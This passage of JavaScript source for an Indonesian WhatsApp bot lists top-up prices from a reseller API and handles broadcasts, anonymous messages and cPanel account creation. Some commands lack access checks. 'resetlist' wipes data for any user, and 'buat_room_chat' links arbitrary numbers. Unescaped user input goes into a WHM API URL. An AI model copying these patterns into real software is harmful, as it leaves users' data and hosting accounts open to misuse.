{title: "Garena Shell Murah", rowId: prefix+"list_harga_gs", description: "Menampilkan list harga Voucher Garena Shell"},
{title: "Garena Free Fire", rowId: prefix+"list_harga_ff", description: "Menampilkan list harga Diamond FF Murah"},
{title: "Mobile Legends", rowId: prefix+"list_harga_ml", description: "Menampilkan list harga Diamond ML Murah"},
]},
{title: "༆━━━━━[ 𝗧𝗼𝗸𝗲𝗻 𝗟𝗶𝘀𝘁𝗿𝗶𝗸 ]━━━━━࿐",
rows: [
{title: "Token PLN Murah", rowId: prefix+"list_harga_pln", description: "Menampilkan list harga Token PLN"},
]},
{title: "༆━━━━━[ 𝗖𝗼𝗻𝘃𝗲𝗿𝘁 𝗦𝗮𝗹𝗱𝗼 ]━━━━━࿐",
rows: [
{title: "Saldo Ovo", rowId: prefix+"list_harga_ovo", description: "Menampilkan list harga Saldo Ovo"},
{title: "Saldo Dana", rowId: prefix+"list_harga_dana", description: "Menampilkan list harga Saldo Dana"},
{title: "Saldo Gopay", rowId: prefix+"list_harga_gopay", description: "Menampilkan list harga Saldo Gopay"},
{title: "Saldo LinkAja", rowId: prefix+"list_harga_linkaja", description: "Menampilkan list harga Saldo LinkAja"},
{title: "Saldo ShopeePay", rowId: prefix+"list_harga_shoope", description: "Menampilkan list harga Saldo ShopeePay"},
]},
{title: "༆━━━━━[ 𝗣𝘂𝗹𝘀𝗮 𝗧𝗿𝗮𝗻𝘀𝗳𝗲𝗿 ]━━━━━࿐",
rows: [
{title: "Operator XL", rowId: prefix+"list_harga_xl", description: "Menampilkan list harga Pulsa XL"},
{title: "Operator Axis", rowId: prefix+"list_harga_axis", description: "Menampilkan list harga Pulsa Axis"},
{title: "Operator Three", rowId: prefix+"list_harga_three", description: "Menampilkan list harga Pulsa Three"},
{title: "Operator Indosat", rowId: prefix+"list_harga_indosat", description: "Menampilkan list harga Pulsa Indosat"},
{title: "Operator Telkomsel", rowId: prefix+"list_harga_telkomsel", description: "Menampilkan list harga Pulsa Telkomsel"},
]}
]
let isian = `List harga produk yang kami
sediakan, silahkan pilih salah satu.`
const listMessage = {
text: isian,
buttonText: "Touch me senpai",
sections
}
conn.sendMessage(from, listMessage)
}
break
case 'list_harga_gs':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regExcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listff = [];
for (let x of res.data.data) {
if (x.code.includes("VGR")) {
listff.push(x)
}
}
var teks = `*List Harga Voucher Garena Shell*\n\n`
listff.sort(regExcomp)
for (let i of listff) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'internet_indosat':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regExcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listff = [];
for (let x of res.data.data) {
if (x.code.includes("ID")) {
listff.push(x)
}
}
var teks = `*List Harga Indosat Telepon*\n\n`
listff.sort(regExcomp)
for (let i of listff) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n*Note:* ${i.note}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_ff':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regExcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listff = [];
for (let x of res.data.data) {
if (x.code.includes("FF")) {
listff.push(x)
}
}
var teks = `*List Harga Diamond Free Fire*\n\n`
listff.sort(regExcomp)
for (let i of listff) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_ml':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listml = [];
for (let x of res.data.data) {
if (x.code.startsWith("VMLSO")) {
listml.push(x)
}
}
var teks = `*List Harga Diamond Mobile Legends*\n\n`
listml.sort(regeXcomp)
for (let i of listml) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_telkomsel':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("STF")) {
listaov.push(x)
}
}
var teks = `*List Harga Pulsa Telkomsel*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_indosat':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("ITF")) {
listaov.push(x)
}
}
var teks = `*List Harga Pulsa Indosat*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n*Note :* ${i.note}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_three':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("TTF")) {
listaov.push(x)
}
}
var teks = `*List Harga Pulsa Three*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_xl':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("XLTF")) {
listaov.push(x)
}
}
var teks = `*List Harga Pulsa XL*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_axis':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("AXTF")) {
listaov.push(x)
}
}
var teks = `*List Harga Pulsa Axis*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_ovo':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("OVO")) {
listaov.push(x)
}
}
var teks = `*List Harga Saldo OVO*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_dana':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("DANA")) {
listaov.push(x)
}
}
var teks = `*List Harga Saldo DANA*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_linkaja':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("LINKAJA")) {
listaov.push(x)
}
}
var teks = `*List Harga Saldo LinkAja*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_shoope':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("SHP")) {
listaov.push(x)
}
}
var teks = `*List Harga Saldo Shoope Pay*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_gopay':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("GOPAY")) {
listaov.push(x)
}
}
var teks = `*List Harga Saldo GOPAY*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_pln':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("PLN")) {
listaov.push(x)
}
}
var teks = `*List Harga Token Listrik*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'resetdb':{
if (!isOwner) return reply(mess.OnlyOwner)
let para_kos = "[]"
db_user.splice(para_kos)
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user, null, 1))
await sleep(1000)
db_menfes.splice(para_kos)
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, null, 1))
reply('Sukses restart database')
}
break
case 'resetlist':
db_respon_list.splice('[]')
fs.writeFileSync('./database/db_ListMessage', JSON.stringify(db_respon_list, null, 1))
reply('Sukses Reset List Message')
break
case 'server':{
if (!isOwner) return reply(mess.OnlyOwner)
axios({
method: "POST",
url: "https://atlantic-pedia.co.id/api/profile",
data: qs.stringify({
key: setting.apikey_antlatic
})
}).then(data => {
if (data.data.result == false) return reply('Maaf kak IP server belom terhubung')
data = data.data.data
let tt_ser = `「 *PROFIL ANTLATIC* 」

• Username : ${data.username}
• Fullname : ${data.full_name}
• Sisa Saldo : Rp${toRupiah(data.balance)}
• Total Order : ${data.order}
• Pemakaian Saldo : Rp${toRupiah(data.spent)}

Runtime :
${runtime(process.uptime())}`
 reply(tt_ser)
})
}
break

// BROADCAST
case 'bctext':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} hallo`)
let db_orang = JSON.parse(fs.readFileSync('./database/pengguna.json'));
let data_teks = `${q}`
for (let i of db_orang){ 
var button_broadcast = {text: data_teks, footer: '©broadcast', buttons: [{ buttonId: '!menu', buttonText: {displayText: 'List Menu'}, type: 1}],headerType: 1}
conn.sendMessage(i.id, button_broadcast)
await sleep(2000)
}
reply(`*Sukses mengirim broadcast text ke ${db_orang.length} user*`)
}
break
case 'bcvideo':{
if (!isOwner) return reply(mess.OnlyOwner)
if (isVideo || isQuotedVideo){
await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
reply(mess.wait)
var bc_video = `./sticker/${setting.ownerNumber.split('@')[0]}.mp4`
for (let i of db_user){
conn.sendMessage(i.id, {video:{url:bc_video}, caption:'*©broadcast*'})
await sleep(2000)
}
reply(`*Sukses mengirim broadcast video ke ${db_user.length} user*`)
fs.unlinkSync(bc_video)
} else {
reply(`*kirim video dengan caption ${prefix+command} atau reply video dengan pesan ${prefix+command}*`)
}
}
break
case 'bcimage':{
if (!isOwner) return reply(mess.OnlyOwner)
if (isImage || isQuotedImage){
await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split("@")[0]}.jpg`)
reply(mess.wait)
var bc_image = `./sticker/${setting.ownerNumber.split('@')[0]}.jpg`
for (let i of db_user){
conn.sendMessage(i.id, {image:{url:bc_image}, caption:'*©broadcast*'})
await sleep(2000)
}
reply(`*Sukses mengirim broadcast image ke ${db_user.length} user*`)
fs.unlinkSync(bc_image)
} else {
reply(`*kirim gambar dengan caption ${prefix+command} atau reply gambar dengan pesan ${prefix+command}*`)
}
}
break
case 'bcaudio':{
if (!isOwner) return reply(mess.OnlyOwner)
if (isQuotedAudio){
await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${sender.split("@")[0]}.mp3`)
reply(mess.wait)
var bc_audio = `./sticker/${setting.ownerNumber.split('@')[0]}.mp3`
for (let i of db_user){
conn.sendMessage(i.id, {audio:{url:bc_audio}, mimetype:'audio/mpeg', fileName:'bcaudio.mp3'})
await sleep(2000)
}
reply(`*Sukses mengirim broadcast audio ke ${db_user.length} user*`)
fs.unlinkSync(bc_audio)
} else {
reply(`*reply audio dengan pesan ${prefix+command}*`)
}
}
break
case 'bc':
case 'siaran':
case 'broadcast':
if (!isOwner) return reply(mess.OnlyOwner)
reply(`*BROADCAST*

*Type Text*
*Example:* 
#bctext <text>

*Type Audio*
*Example:*
#bcaudio <reply audio>

*Type Video*
*Example:*
#bcvideo <reply video>

*Type Image*
*Example:*
#bcimage <reply image>

_Broadcast › Chat All User_`)
break

// OWNER ONLY
case 'setexif':
case 'setwm':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('*Contoh:*\n#setwm pack|author')
let nama_Pack = q.split('|')[0]
let author_Pack = q.split('|')[1]
if (!nama_Pack) return reply('*Contoh:*\n#setwm pack|author')
if (!author_Pack) return reply('*Contoh:*\n#setwm pack|author')
exif.create(nama_Pack, author_Pack)
reply('Sukses membuat exif')
}
break
case 'buat_room_chat':{
var id_satu = q.split('|')[0]
var id_dua = q.split('|')[1]
var id_rom = q.split('|')[2]
db_menfes.push({"id": id_satu, "teman": id_dua})
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, 2, null))
db_menfes.push({"id": id_dua, "teman": id_satu})
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, 2, null))
var tulis_pesan = `_Chat Sudah Terhubung✓_
_Silahkan Kirim Pesan✍_

_*ID ROOM: ${id_rom}*_`
conn.sendMessage(id_satu, {text:tulis_pesan})
conn.sendMessage(id_dua, {text:tulis_pesan})
}
break
case 'stopchat': case 'stop': case 'leave':
if (cekPesan("id", sender) == null) return reply(`Kamu sedang tidak didalam roomchat, Silahkan buat room dengan contoh dibawah ini.\n\n*Example:*\n#menfess num|nama|pes\n\n*Contoh:*\n#menfess 628xxx|bot|hai\n\n*Note:*\n6285789004732 - benar (✅)\n+62 857 8900 4732 - salah (❌)`)
if (isGroup) return reply(mess.OnlyPM)
var aku = sender
var dia = cekPesan("teman", aku)
var teks_aku = `[✓] Berhasil memberhentikan chat`
setRoom("±id", dia, null)
setRoom("±teman", dia, null)
await sleep(2000)
conn.sendMessage(aku,{text:teks_aku})
setRoom("±id", aku, null)
setRoom("±teman", aku, null)
var teks_dia = `[✓] Room chat telah dihentikan\noleh teman chat kamu👤`
conn.sendMessage(dia,{text:teks_dia})
db_menfes.splice('[]')
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, null, 1))
break
case 'menfes': case 'menfess':{
if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam roomchat ketik *#stopchat* untuk menghapus sesi chat.")
if (!q) return reply(`Format Fitur Menfess / Kirim pesan rahasia ke seseorang Lewat bot\n\n_*Example*_\n${prefix+command} wa|pengirim|pesan\n\n_*Contoh*_\n${prefix+command} 6285789004732|bot|hai\n\n*Note :*\nBerawal dari 628xxx tanpa spasi`)
let num = q.split('|')[0]
let nama_pengirim = q.split('|')[1]
let pesan_teman = q.split('|')[2]
var cekap = await conn.onWhatsApp(num+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Nomor +${num}\ntidak terdaftar di WhatsApp`)
let roomC = `#${makeid(10)}`
if (num == botNumber.split('@')[0]) return reply('Itu kan nomor bot')
if (num == sender.split('@')[0]) return reply('Menfes ke nomor sendiri:v\ncapek ya? semangat🗿')
if (!num) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
if (!nama_pengirim) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
if (!pesan_teman) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
let text_menfess = `*ANONYMOUS CHAT*\n_Hallo Kak ${ucapanWaktu}_\n_Ada pesan *Menfess/Rahasia*_\n\n*• Dari :* ${nama_pengirim}\n*• Pesan :* ${pesan_teman}\n\n_Pesan ini ditulis oleh seseorang_\n_Bot hanya menyampaikan saja._`
let btn_menfes = [{ buttonId: `${prefix}buat_room_chat ${sender}|${num}@s.whatsapp.net|${roomC}`, buttonText: { displayText: 'Lanjutkan ✍️' }, type: 1 }]
var button_menfess = {
text: text_menfess,
footer: 'Klik button untuk membalas chat.',
buttons: btn_menfes,
headerType: 1
}
conn.sendMessage(`${num}@s.whatsapp.net`, button_menfess)
reply('Pesan Menfess kamu sudah dikirim, Sedang menunggu untuk diterima.')
if (isGroup) return reply("Pesan menfess kamu sudah dikirim.")
}
break
case 'sc': case 'script':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let text_buysc =`*_Mau beli scriptnya? harga murah kok._*

*Contact Person 📞*

*Admin:*
*Wa.me/6281574773972*

_*Harga Normal :*_ ~Rp150.000~
*_Harga Promo : Rp100.000_*

_Sudah Termasuk Tutorial_
_Script Sudah Disusun Rapih_
_Size Script Sudah Ringan_
_Anti Ngelag - Anti Delay_
_Anti Spam - Anti Call_
_Total Fitur 600+_
_Topup & Deposit_`
conn.sendMessage(from, { text: text_buysc }, { quoted: msg })
}
break
case 'request': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} Req fitur antilink bg`)
teks = `*| REQUEST FITUR |*`
teks1 = `\n\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`
teks2 = `\n\nSucces send to owner`
for (let i of setting.ownerNumber) {
conn.sendMessage(i, {text: teks + teks1, mentions:[sender]}, {quoted:msg})
}
conn.sendMessage(from, {text: teks + teks2 + teks1, mentions:[sender]}, {quoted:msg})
}
break
case 'report': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} Fitur anu error bang`)
teks = `*| REPORT FITUR |*`
teks1 = `\n\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`
teks2 = `\n\nSucces send to owner`
for (let i of setting.ownerNumber) {
conn.sendMessage(i, {text: teks + teks1, mentions:[sender]}, {quoted:msg})
}
conn.sendMessage(from, {text: teks + teks2 + teks1, mentions:[sender]}, {quoted:msg})
}
break
case 'createcp':
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`*CREATECP ACCOUNT*\nExample:\n#${command} domain|package\n\nContoh:\n#${command} lexxyapi.com|lexxy`)
let usern = `USER${makeid(6)}`
let domain = q.split('|')[0] 
let pekeg = q.split('|')[1]
if (!domain) return reply('Domain wajib di isi!!')
if (!pekeg) return reply('Package Wajib di isi!!')
reply('Creating please wait... ⏳')
axios.get(`https://${hostwhm}:2087/json-api/createacct?api.version=1&username=${usern}&contactemail=lexxyofficial24@gmail.com&plan=${pekeg}&domain=${domain}`, authWhm)
.then(response => {     
let np = response.data
if (np.metadata.result == 0) {
reply(np.metadata.reason)
} else {
let dsta = np.metadata.output.raw;
var substr = dsta.substring(
dsta.toString().indexOf("+===================================+")
); //substr = 'word. Hello!'
let xxybot = substr.split("| Language: en")[0];
reply(`${xxybot}\n\nLogin : https://${hostwhm}:2087`)
}});
break
case 'listcp':
if (!isOwner) return reply(mess.OnlyOwner)
reply('Wait Getting List Account info....')
axios.get(`https://${hostwhm}:2087/json-api/listaccts?api.version=1`, authWhm)
.then((risol) => {
let lisol = risol.data
var ttdy = lisol.data.acct
let ogh = `*── 「 LIST CPANEL 」 ──*\nTotal Akun : ${ttdy.length}\n`
for (let i = 0; i < ttdy.length; i++) {
ogh += `
\n
─────[\`\`\` ${ttdy[i].user} \`\`\` ]────────
*▢ Maxsub* : ${ttdy[i].maxsub}
*▢ Maxsql* : ${ttdy[i].maxsql}
*▢ Startdate* : ${ttdy[i].startdate}
*▢ Disklimit* : ${ttdy[i].disklimit}
*▢ Maxlst* : ${ttdy[i].maxlst}
*▢ Plan* : ${ttdy[i].plan}
*▢ Owner*: ${ttdy[i].owner}
*▢ IP* : ${ttdy[i].ip}
*▢ Domain* : ${ttdy[i].domain}
*▢ Diskused* : ${ttdy[i].diskused}
*▢ Maxaddons* : ${ttdy[i].maxaddons}
*▢ Suspendreason* : ${ttdy[i].suspendreason}
─────────────────\n\n`
}
reply(ogh)
})
break
case 'terminate':
if (!isOwner) return reply(mess.OnlyOwner)
if (args.length < 2) return reply(`Kirim perintah #${command} username`)
